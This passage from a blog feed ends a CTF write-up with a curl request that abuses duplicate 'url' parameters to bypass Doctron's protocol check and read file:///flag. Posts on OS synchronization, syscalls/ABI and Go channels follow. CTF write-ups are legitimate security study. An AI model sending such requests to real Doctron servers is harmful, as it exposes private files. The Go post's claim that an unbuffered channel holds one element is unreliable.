<code>ctx.URLParam(&quot;url&quot;)</code> 获取的是第一个同名参数的值，而 Doctron 后续的参数绑定机制获取的是最后一个。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">&quot;http://&lt;host&gt;:&lt;port&gt;/convert/html2image?u=doctron&amp;p=lampnick&amp;url=http://example.com&amp;url=file:///flag&quot;</span></span><br></pre></td></tr></table></figure><p>这次尝试返回了 <code>HTTP/1.1 200 OK</code>，<code>Content-Type: image/png</code>，并开始进行分块编码传输，但最终传输失败。这证明<strong>重复参数成功绕过了 <code>CheckParams</code> 的协议校验</strong>，Doctron 成功读取了 <code>/flag</code> 文件内容，并尝试进行图片转换！</p><p>破损不要紧，我们先保存下来看看？<br><img src="/2025/04/28/SYSU%20W4terCTF%202025/doctron_succeed.png" alt="doctron_succeed.png"></p><h1 id="w4terctf-2025-总结"><a class="markdownIt-Anchor" href="#w4terctf-2025-总结"></a> W4terCTF 2025 总结</h1><p>28号开始的比赛，历时一周，终于在五一假期的末尾结束了！一开始只想着做几道签到题感受一下什么是 CTF ，没想到队友发挥强劲，我也在强烈的“正反馈”下，直接把所有时间都投入了进去。非常非常高兴我们 Team Nooob 能在校赛上拿下前十！！！！！！！<br><img src="/2025/04/28/SYSU%20W4terCTF%202025/ranking.png" alt="ranking.png"><br><img src="/2025/04/28/SYSU%20W4terCTF%202025/curve.png" alt="curve.png"></p><p>作为十足的新手，在这次的校赛中收获颇丰。印象最深的是 WMC25 的三道题目，从最开始的栈溢出，到想办法获得 Canary 值并绕过，覆盖返回地址为后门函数，再到开启 PIE 随机加载地址，尝试获得 Libc 基址实现 ret2libc，再最后构造精巧的 ROP 调用链，实现调用一个“从未出现过”的函数！这一切回想起来还是令人激动不已，虽然这些都是 CTF 最基础的内容，但是亲手实践并一步步攻克难点的过程对于新手的我来说是宝贵的经验。</p><p>不畏浮云遮望眼，在大佬云集的校赛拿下如此成绩实在得感谢队友们的付出。那么，明年再会，那时候的我会更加强大！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Hack for fun not for profit_&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以下是我在 Team Nooob 队伍中负责的题目。&lt;/p&gt;
&lt;h1 id=&quot;签到问卷&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Operating System Concepts: Synchronization</title>
    <link href="http://example.com/2025/04/20/Operating-System-Concepts-Ch6/"/>
    <id>http://example.com/2025/04/20/Operating-System-Concepts-Ch6/</id>
    <published>2025-04-20T06:12:39.233Z</published>
    <updated>2025-04-20T06:13:50.785Z</updated>
    
    <content type="html"><![CDATA[<h1 id="concurrence-control"><a class="markdownIt-Anchor" href="#concurrence-control"></a> Concurrence Control</h1><p><strong><em>Multiprogramming</em></strong> introduces the possibility of <strong><em>concurrent</em></strong> execution, and if concurrent execution is not properly managed in terms of accessing shared resources (process communication), it can lead to <strong><em>race conditions</em></strong>. To avoid race conditions, <strong><em>synchronization</em></strong> mechanisms such as locks or semaphores are required. However, if these mechanisms are used improperly (e.g., inconsistent lock acquisition order), they may result in <strong><em>deadlock</em></strong>.</p><h2 id="mutual-exclution-synchronization"><a class="markdownIt-Anchor" href="#mutual-exclution-synchronization"></a> Mutual Exclution &amp; Synchronization</h2><p>Mutual exclusion and synchronization are two of the requirements in concurrent program.</p><ul><li>Different threads share the same resource, so we need <em>mutual exclusion</em> to concurrently <strong>control in sapce</strong>.</li><li>Different threads may rely on other threads, so we need to <em>synchronizaztion</em> to concurrently <strong>control in timing sequence</strong>.</li></ul><p>For example, in the <strong>producer-consumer problem</strong>:</p><ul><li><strong>Mutual Exclusion</strong> (Space): Protects access to the shared buffer using a mutex.</li><li><strong>Synchronization</strong> (Timing): Ensures the producer waits if the buffer is full and the consumer waits if the buffer is empty, so they operate in the correct sequence.</li></ul><h1 id="mechanisms"><a class="markdownIt-Anchor" href="#mechanisms"></a> Mechanisms</h1><h2 id="mutual-exclusion-spin-lock-mutex-lock"><a class="markdownIt-Anchor" href="#mutual-exclusion-spin-lock-mutex-lock"></a> Mutual Exclusion: Spin lock &amp; Mutex lock</h2><p><strong>A spinlock is a synchronization primitive that uses <a href="https://www.baeldung.com/cs/os-busy-waiting">busy-waiting</a></strong>. When a thread attempts to acquire a spinlock that another thread already holds, it continuously checks the lock in a loop (spins) until the lock becomes available, which is non-blocking.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Spin lock</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">spinlock_lock</span><span class="params">(<span class="type">spinlock_t</span> *s)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (atomic_exchange(&amp;s-&gt;lock, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// busy-waiting</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spinlock_unlock</span><span class="params">(<span class="type">spinlock_t</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">atomic_store</span>(&amp;s-&gt;lock, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>A mutex is a mechanism that locks critical sections of code and only allows one thread to acquire the lock and use the resources at a time</strong>. If another thread tries to run the critical section while it’s locked, the OS puts this thread to sleep, which is blocking:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mutex lcok</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Mutex_Lock</span><span class="params">(Mutex* mutex)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (atomic_exchange(&amp;mutex-&gt;state, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Add current thread to waiting queue</span></span><br><span class="line">        Queue_Enqueue(&amp;mutex-&gt;waiting_queue, current_thread);</span><br><span class="line">Thread_Block(current_thread);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Mutex_Unlock</span><span class="params">(Mutex* mutex)</span> &#123;</span><br><span class="line">    <span class="type">atomic_store</span>(&amp;mutex-&gt;state, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// signal()</span></span><br><span class="line">    <span class="keyword">if</span> (!Queue_IsEmpty(&amp;mutex-&gt;waiting_queue)) &#123;</span><br><span class="line">        Thread* next_thread = Queue_Dequeue(&amp;mutex-&gt;waiting_queue);</span><br><span class="line">        Thread_Unblock(next_thread);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When it comes to performance, <strong>mutexes involve context switches, which can introduce significant overhead, especially if the critical section is short</strong>. This overhead arises because the operating system needs to put the thread to sleep and later wake it up.</p><p>In contrast, <strong>spinlocks don’t use context switches. Therefore, they are faster for short critical sections,</strong> but this speed comes at the cost of potentially wasting CPU cycles if the wait time for the lock to become available is longer.</p><h2 id="synchronizaion-semaphore-condition-variable"><a class="markdownIt-Anchor" href="#synchronizaion-semaphore-condition-variable"></a> Synchronizaion: Semaphore &amp; Condition Variable</h2><p><strong><em>Semaphore</em> is more powerful in terms of functionality</strong>:</p><ul><li>It can <strong>achieve both mutual exclusion and synchronization</strong>.</li><li>A <strong>binary semaphore</strong> (initialized to 1) acts like a <strong>mutex</strong> to enforce <strong>mutual exclusion</strong>.</li><li>A <strong>counting semaphore</strong> (initialized to N) allows up to <strong>N threads</strong> to access a resource concurrently.</li><li>Semaphores inherently track state (e.g., counting mechanism), so <strong>signals are not lost</strong> if no thread is currently waiting.</li></ul><p><strong><em>Condition variable</em> is more expressive for certain synchronization patterns</strong>:</p><ul><li>It’s <strong>purely for synchronization</strong>, meaning it does not provide mutual exclusion on its own.</li><li>It requires an <strong>explicit lock (mutex)</strong> to protect shared data.</li><li>It is <strong>more suitable for event-based synchronization</strong> (e.g., producer-consumer, where a thread waits until a condition is met).</li><li>Unlike semaphores, if a condition variable is signaled <strong>before a thread starts waiting, the signal is lost</strong>.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Templet of using condition vaiable</span></span><br><span class="line">mutex_lock(&amp;lk);</span><br><span class="line"><span class="keyword">while</span> (!CONDITION) &#123;</span><br><span class="line">cond_wait(&amp;lk, &amp;cond_var)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* critical section */</span></span><br><span class="line"></span><br><span class="line">cond_signal(&amp;lk, &amp;cond_var)</span><br><span class="line"><span class="comment">// or cond_broadcast()</span></span><br><span class="line">mutex_unlock(&amp;lk);</span><br></pre></td></tr></table></figure><p>Semaphores are lower-level and more flexible but trickier to use correctly. Condition variables make synchronization easier to reason about when dealing with complex thread interactions. If you misuse semaphores, you risk deadlocks or priority inversions. If you misuse condition variables, you risk lost signals and unexpected hangs.</p><h1 id="synchronization-problems"><a class="markdownIt-Anchor" href="#synchronization-problems"></a> Synchronization Problems</h1><h2 id="1-producers-consumers-problem"><a class="markdownIt-Anchor" href="#1-producers-consumers-problem"></a> 1. Producers-Consumers Problem</h2><p>This classic synchronization problem consists of two types of processes: producer and consumer.</p><ul><li><strong>Producer</strong>: Generates data and places it into a shared bounded buffer (mutual exclusion) <strong>only if it’s not full</strong> (synchronization).</li><li><strong>Consumer</strong>: Retrieves data from the buffer for processing <strong>only if it’s not empty.</strong></li></ul><h2 id="2-readers-writers-problem"><a class="markdownIt-Anchor" href="#2-readers-writers-problem"></a> 2. Readers-Writers Problem</h2><p>Different from producers-consumers problem, we distinguish between two types of processes: <strong><em>readers</em></strong>, which may want only to read the shared data; <strong><em>writers</em></strong>, which may update (to read and write) the shared data. While a reader is reading, other readers can read the shared data simultaneously because the data won’t change. However, when a writer is updating the data, no other process, including readers and writers, can access the shared data.</p><p>This problems have some variations, all involving priorities:</p><ul><li>No readers be kept waiting unless a writer has already obtained the lock --&gt; <strong>writers starvation</strong></li><li>Writer perform its write as soon as possible once it is ready --&gt; <strong>readers starvation</strong></li></ul><p>The readers-writer problem and its solutions can be generalized to <strong>reader-writer lock</strong>, which have read and write modes. Acquiring a reader-writer lock requires specifying the mode of the lock: <em>read</em> or <em>write</em> access.</p><p>Reader-Writer lock is suitable for some situations where reading is performed frequently while writing is in low frequency:</p><ol><li><strong>Caching system</strong>: data will be frequently read but only be wrote when caching expires or data updating</li><li><strong>Configuration management</strong>: configuration data will be frequently read simultaneously by several threads but only when configuration updating, writing happens</li></ol><h2 id="3-dining-philosophers-problem"><a class="markdownIt-Anchor" href="#3-dining-philosophers-problem"></a> 3. Dining-Philosophers Problem</h2><p>TODO</p><hr><p><strong>Reference:</strong></p><ul><li>DeepSeek</li><li><em>Operating System Concepts, 9th edition</em></li><li><a href="https://segmentfault.com/a/1190000039844055">【操作系统—并发】条件变量与信号量 - 个人文章 - SegmentFault 思否</a></li><li><a href="https://jyywiki.cn/OS/2024/lect10.md">Yanyan’s Wiki</a></li><li><a href="https://www.baeldung.com/cs/mutex-vs-spinlock-concurrent-parallel-distributed-programming">https://www.baeldung.com/cs/mutex-vs-spinlock-concurrent-parallel-distributed-programming</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;concurrence-control&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#concurrence-control&quot;&gt;&lt;/a&gt; Concurrence Control&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Multiprog</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>为什么应用程序是特定于操作系统的</title>
    <link href="http://example.com/2025/04/15/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%98%AF%E7%89%B9%E5%AE%9A%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84/"/>
    <id>http://example.com/2025/04/15/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%98%AF%E7%89%B9%E5%AE%9A%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84/</id>
    <published>2025-04-15T13:55:02.487Z</published>
    <updated>2025-04-22T13:23:02.326Z</updated>
    
    <content type="html"><![CDATA[<p>看视频看到了一个很有意思的问题：<a href="https://www.youtube.com/watch?v=eP_P4KOjwhs">Why applications are operating-system specific?</a></p><h1 id="观点看法"><a class="markdownIt-Anchor" href="#观点看法"></a> 观点看法</h1><p>对于这个问题，我的能想到答案便是 syscalls 。尽管机器的架构可能是相同的（即应用程序被编译为同一指令集），但应用并非直接与硬件交互，它们之间存在了一个中间层——操作系统。应用在 user mode 下只能执行有限的计算指令，而为了使用 I/O 设备、内存、文件系统等软硬件资源，必须调用 OS 提供给用户的 API，即 system calls，将控制转移给 OS，CPU 切换为 kernel mode，执行写死的 syscall 内核代码并返回结果给应用。</p><p>不同操作系统提供的 syscalls 有很大的不同。以 Windows 和 Unix/Linux 的创建进程的系统调用为例：</p><ul><li>在 Win 的 API 下，进程调用<code>CreateProcess()</code>创建一个进程执行指定的可执行文件</li><li>Unix/Linux 下，进程调用<code>fork()</code>仅复制了进程本身，为了加载执行程序还需调用<code>exec()</code></li></ul><p>实现的不同导致 syscall 的行为不同，也就无法实现应用程序的跨平台了。所以同一段代码逻辑，在编程语言层面的编写就有很大不同了，编译为汇编代码那么就会有更大的不同！</p><hr><p>在总结视频内容的基础之上，详细补充在 <em>Operating System Concepts</em> 章节笔记中缺失的一些概念并在此之上延申出一些思考：</p><ul><li>系统调用 system calls<ul><li>Shell 的构建</li><li>x86 <code>syscall</code>指令：Hardware-based context switch v.s. Software-based context switch</li></ul></li><li>ABI (Application Binary Interface)</li></ul><hr><h1 id="1-系统调用-system-call"><a class="markdownIt-Anchor" href="#1-系统调用-system-call"></a> 1. 系统调用 System Call</h1><p>上面说了我对 syscall 的思考，实际上，就算不同操作系统对同一系统调用的接口与实现相同，但<strong>底层实现的细节</strong>依旧会导致应用无法跨平台运行。</p><h2 id="系统调用表-system-call-table"><a class="markdownIt-Anchor" href="#系统调用表-system-call-table"></a> 系统调用表 System Call Table</h2><p>首先补充上下文切换的一些知识点：<strong>Hardware-based context switch v.s. Software-based context switch</strong></p><p>抢占式调度依赖中断实现，其中时间片轮转（Round Robin）依赖时钟中断实现，CPU 响应中断会进行进程的上下文切换，保存当前进程的所有<strong>状态</strong>到 PCB 中，再从 PCB 加载新进程的<strong>状态</strong>。</p><p>system call 也会使 CPU 从用户态转换为内核态，为了执行在操作系统内核代码中写定的系统调用例程，CPU 同样需要进行上下文的切换，但这个过程只保留一些必要的寄存器值，因为本质上还是在执行这个进程。至少需要保存的寄存器有：</p><ul><li>Program Counter (<code>PC</code>) / <code>%rip</code></li><li>Stack Pointer (<code>%rsp</code>) 切换为内核栈</li><li>标志寄存器</li><li>syscall 传参所占用的寄存器</li></ul><hr><p>回到之前的问题，如果程序汇编代码中有如下的 syscall（x86 为例）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 57  // set the system call number</span><br><span class="line">syscall      // transfer control</span><br></pre></td></tr></table></figure><ol><li>不同的操作系统可能读取不同的寄存器来获取系统调用序号，所以如果读取的是<code>%rbx</code>，那么直接系统就 crash 了。</li><li>就算是读取同一寄存器，但对于同一序号可能实现的是不同的 syscall。<br><img src="/2025/04/15/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%98%AF%E7%89%B9%E5%AE%9A%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84/win.png" alt="windows.png"><br><img src="/2025/04/15/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%98%AF%E7%89%B9%E5%AE%9A%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84/linux.png" alt="linux.png"></li></ol><h1 id="2-参数传递与-abi"><a class="markdownIt-Anchor" href="#2-参数传递与-abi"></a> 2. 参数传递与 ABI</h1><p>大部分系统调用都需要传递参数，那么将参数写到什么地方也会产生问题：<code>OS1</code>可能读取的是寄存器上的参数值，而<code>OS2</code>可能读取的是内存上的参数值。通过内存传递参数又分为通过栈或者一块特定的内存空间。这就是底层 ABI 之间的差异造成的不兼容。</p><hr><h2 id="application-binary-interface-abi"><a class="markdownIt-Anchor" href="#application-binary-interface-abi"></a> Application Binary Interface (ABI)</h2><p>类比 API 是我们如何在语言层面调用函数，ABI 则是在汇编/二进制码层面具体是如何调用的。</p><blockquote><p><strong>ABI = binary-level contract</strong> that defines how functions, data, and system calls are represented and interacted with at runtime.</p></blockquote><p>除了前述的参数传递的规定，ABI 还包括：</p><ul><li><strong>Register usage</strong>: registers are caller-saved vs callee-saved</li><li><strong>Binary format</strong>: Format of executable files (like ELF on Linux, PE on Windows)</li><li><strong>System call interface</strong>: How system calls are made (via <code>syscall</code>, <code>int 0x80</code>, etc.)</li><li><strong>Exception handling</strong>: How exceptions are represented and handled in binary</li></ul><p>具体举 x86-64 System V ABI (Linux) 为例：</p><ul><li>前六个参数的值设置在: <code>RDI, RSI, RDX, RCX, R8, R9</code></li><li>返回值设置: <code>RAX</code></li><li>在 <code>call</code>之前栈必须以 16 字节对齐</li><li>Caller-saved: <code>RAX, RCX, RDX, RSI, RDI, R8–R11</code></li><li>Callee-saved: <code>RBX, RBP, R12–R15</code></li></ul><hr><h1 id="3-可执行文件格式"><a class="markdownIt-Anchor" href="#3-可执行文件格式"></a> 3. 可执行文件格式</h1><p>不同操作系统的可执行文件格式不同，其中包含了描述该文件的 meta-data 和具体文件数据。</p><p>以 ELF 为例：<img src="/2025/04/15/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%98%AF%E7%89%B9%E5%AE%9A%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84/elf.png" alt="elf.png"><br>文件中的不同 section 具有不同的用途，<code>.debug</code>用于调试，<code>.symtab</code>用于链接，<code>.data</code>和<code>.bss</code>用于初始化/未初始化数据的读写</p><h1 id="4-运行时环境-runtime"><a class="markdownIt-Anchor" href="#4-运行时环境-runtime"></a> 4. 运行时环境 runtime</h1><p>Java 运行在 JVM 上，Python 代码通过解释器解释执行，JS 也会被浏览器的 Javascript 引擎解释执行，通过虚拟化可以很好地避免上述问题。但现代程序都是模块化的，如果特定模块所需要的环境在另一个操作系统上并没有提供，那么整个程序都无法运行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看视频看到了一个很有意思的问题：&lt;a href=&quot;https://www.youtube.com/watch?v=eP_P4KOjwhs&quot;&gt;Why applications are operating-system specific?&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;观点看</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Go协程与通道机制</title>
    <link href="http://example.com/2025/04/07/Go%E5%8D%8F%E7%A8%8B%E4%B8%8E%E9%80%9A%E9%81%93%E6%9C%BA%E5%88%B6/"/>
    <id>http://example.com/2025/04/07/Go%E5%8D%8F%E7%A8%8B%E4%B8%8E%E9%80%9A%E9%81%93%E6%9C%BA%E5%88%B6/</id>
    <published>2025-04-07T06:12:17.966Z</published>
    <updated>2025-04-10T06:47:15.772Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Don’t communicate by sharing memory; share memory by communicating.</p></blockquote><h1 id="goroutine"><a class="markdownIt-Anchor" href="#goroutine"></a> Goroutine</h1><h2 id="goroutine-与-thread"><a class="markdownIt-Anchor" href="#goroutine-与-thread"></a> goroutine 与 thread</h2><p>在 Go 中，应用程序并发处理的部分被称作 <code>goroutines</code>，它可以进行更有效的并发运算。协程由 Go 运行时 (runtime) 创建，和操作系统线程之间并无一对一的关系（user-kernel thread 映射模型）：协程是根据一个或多个线程的可用性，映射（多路复用）在他们之上的。</p><p>协程调度器在<strong>用户态上</strong>对 goroutines 进行管理，采用 M:N 调度模型（M 个 Goroutine 映射到 N 个线程），可以用<code>GOMAXPROCS</code>（逻辑处理器数量）来控制 N 的数量。相比之下，线程是由操作系统内核进行管理和调度的，被操作系统调度器分配到不同的处理器核心上运行。由于没有内核的介入，协程的创建与切换的开销降低很多。具体来说，Go 采用<strong>协作式调度</strong>（通过  <code>Gosched()</code>  或 <code>channel</code>阻塞主动让出 CPU ），而线程则是由 OS 进行<strong>抢占式调度</strong>（RR, FCFS, …）。</p><p><img src="/2025/04/07/Go%E5%8D%8F%E7%A8%8B%E4%B8%8E%E9%80%9A%E9%81%93%E6%9C%BA%E5%88%B6/gorountine%E8%B0%83%E5%BA%A6.png" alt="gorountine调度"></p><p>摘选<a href="https://zhuanlan.zhihu.com/p/662344603">知乎的一个例子</a>，生动解释了 Goroutine、coroutine 和 thread 之间的联系：</p><blockquote><p><strong>Thread</strong>：想象线程就像是公司的员工。每个员工都有自己的任务和责任，但他们共享公司的资源（例如办公室、打印机等）。员工（线程）的上下班（开始和结束线程）以及工作调度（线程切换）由公司管理层（操作系统）控制。如果公司要新增一个员工或者安排员工之间的工作，这需要管理层的直接参与，也会涉及到较多的人力和物力资源（也就是说，线程的创建和上下文切换成本相对较高）。</p><p><strong>Coroutine</strong>：现在想象协程就像是在家工作的自由职业者。他们使用自己的电脑和办公设备（拥有自己的堆栈和局部变量），并且自己决定什么时候工作、什么时候休息（编程者控制）。他们可以随时暂停工作去喝杯咖啡或是散步（yield 或等待），然后再回来继续工作。所有这些活动的安排都不需要外部管理层的参与（用户级的调度），并且几乎不需要额外的资源（低成本的任务切换）。</p><p><strong>Goroutine</strong>：Goroutine 就像是使用特殊工作方法的自由职业者团队。他们不仅可以自己安排工作时间（<a href="https://zhida.zhihu.com/search?content_id=235316306&amp;content_type=Article&amp;match_order=1&amp;q=%E7%94%A8%E6%88%B7%E6%80%81&amp;zhida_source=entity">用户态</a>调度），还使用一种特殊的通信方式 —— 他们不会直接交谈（共享内存），而是通过写信（传递消息）来沟通（channel 机制）。这种工作方式使他们的合作更加高效和有序（并发编程更容易实现和管理）。</p></blockquote><p><a href="https://studygolang.com/articles/29227?fr=sidebar">GoLang GPM 模型 - Go 语言中文网 - Golang 中文社区</a>介绍了 Go runtime GPM 调度模型，其中很清晰的解释了线程模型 👍</p><h2 id="select"><a class="markdownIt-Anchor" href="#select"></a> select</h2><p>在 Go 里，<code>select</code>语句主要用于在多个通道操作间进行选择。它和<code>switch</code>语句类似，不过<code>switch</code>用于选择不同的条件分支，而<code>select</code>用于选择不同的通道操作。<code>select</code>会阻塞，直到其中一个通道操作准备好，若有多个操作同时就绪，会随机选择一个执行。要是存在<code>default</code>分支，在没有通道操作准备好时，会执行<code>default</code>分支，从而避免阻塞。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例：实现超时控制</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line">    ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">        ch1 &lt;- <span class="string">&quot;data from channel 1&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">        ch2 &lt;- <span class="string">&quot;data from channel 2&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> msg1 := &lt;-ch1:</span><br><span class="line">        fmt.Println(<span class="string">&quot;Received&quot;</span>, msg1)</span><br><span class="line">    <span class="keyword">case</span> msg2 := &lt;-ch2:</span><br><span class="line">        fmt.Println(<span class="string">&quot;Received&quot;</span>, msg2)</span><br><span class="line">    <span class="keyword">case</span> &lt;-time.After(<span class="number">3</span> * time.Second):</span><br><span class="line">        fmt.Println(<span class="string">&quot;Timeout&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>select</code>机制是 Go 语言并发编程中的一个重要特性，它为处理多个通道的并发操作提供了一种简洁、高效且灵活的方式，使得 Go 语言在处理复杂的并发场景时能够更加优雅和易于维护。</p><ul><li><strong>实现并发操作的多路复用</strong>：在并发编程中，经常需要同时处理多个通道的操作。<code>select</code>允许程序在多个通道之间进行选择，当其中任何一个通道准备好进行读取或写入操作时，就可以执行相应的分支逻辑。这使得程序能够高效地处理多个并发任务，避免了逐个检查通道状态的繁琐操作，提高了代码的简洁性和可读性。</li><li><strong>处理异步事件</strong>：在异步编程模型中，各个操作可能在不同的时间点完成，<code>select</code>可以用于监听多个异步操作的完成信号。例如，在网络编程中，可能同时有多个网络连接在进行数据传输，通过<code>select</code>可以随时响应哪个连接有数据可读或可写，从而实现对多个网络连接的高效管理。</li></ul><h1 id="channel"><a class="markdownIt-Anchor" href="#channel"></a> Channel</h1><h2 id="无缓冲同步与有缓冲异步的数据传递"><a class="markdownIt-Anchor" href="#无缓冲同步与有缓冲异步的数据传递"></a> 无缓冲同步与有缓冲异步的数据传递</h2><p>一般我们通过<code>ch := make(chan type)</code>创建的是无缓冲且同步的通道，只有当接收方准备好后发送方才会发送数据，因此通道的发送 / 接收操作在对方准备好之前是阻塞的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 阻塞示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">print</span><span class="params">(ch <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Print(&lt;-ch)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">ch &lt;- <span class="number">2</span>       <span class="comment">// main线程在此被阻塞，产生deadlock，抛出panic</span></span><br><span class="line"><span class="keyword">go</span> <span class="built_in">print</span>(ch)  <span class="comment">// 不会执行这条语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个无缓冲通道只能包含 1 个元素，通过<code>ch := make(chan type, buf)</code>可以设置通道缓存大小。在缓冲区满载之前，给一个带缓冲的通道发送数据是不会阻塞的，而从通道读取数据也不会阻塞，直到缓冲区空了。</p><p>如果容量大于 0，通道就是异步的了：缓冲满载（发送）或变空（接收）之前通信不会阻塞，元素会按照发送的顺序被接收，此时上面的示例可以运行。如果容量是 0 或者未设置，通信仅在收发双方准备好的情况下才可以成功。</p><h2 id="底层数据传递原理"><a class="markdownIt-Anchor" href="#底层数据传递原理"></a> 底层数据传递原理</h2><ul><li><strong>数据复制</strong>：当一个  <code>goroutine</code>  向通道发送数据时，数据会被复制到通道内部。在无缓冲通道中，这个复制操作是在接收者准备好接收数据时才会发生。</li><li><strong>同步机制</strong>：通道使用了互斥锁（mutex）和条件变量（condition 